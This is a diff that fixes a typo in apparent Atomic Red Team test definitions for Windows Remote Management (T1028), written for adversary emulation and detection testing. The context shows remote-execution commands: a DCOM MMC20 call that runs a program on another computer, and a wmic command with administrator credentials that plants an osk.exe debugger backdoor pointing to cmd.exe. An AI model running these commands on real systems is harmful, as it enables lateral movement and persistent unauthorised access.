@@ -23,7 +23,7 @@
 ```
 Enable-PSRemoting -Force
 
-[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","computer1")).Documnet.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
+[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","computer1")).Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
 
 wmic /user:DOMAIN\Administrator /password:#{password} /node:#{computer_name} process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"
 
@@ -53,7 +53,7 @@ winrm.exe
 [{'command': 'Enable-PSRemoting -Force\n',
   'name': None,
   'source': 'atomics/T1028/T1028.yaml'},
- {'command': '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","computer1")).Documnet.ActiveView.ExecuteShellCommand("c:\\windows\\system32\\calc.exe", '
+ {'command': '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","computer1")).Document.ActiveView.ExecuteShellCommand("c:\\windows\\system32\\calc.exe", '
              '$null, $null, "7")\n',
   'name': None,
   'source': 'atomics/T1028/T1028.yaml'},
@@ -214,7 +214,7 @@ winrm.exe
                                                                                         'a '
                                                                                         'remote '
                                                                                         'computer.\n',
-                                                                         'executor': {'command': '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Documnet.ActiveView.ExecuteShellCommand("c:\\windows\\system32\\calc.exe", '
+                                                                         'executor': {'command': '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Document.ActiveView.ExecuteShellCommand("c:\\windows\\system32\\calc.exe", '
                                                                                                  '$null, '
                                                                                                  '$null, '
                                                                                                  '"7")\n',
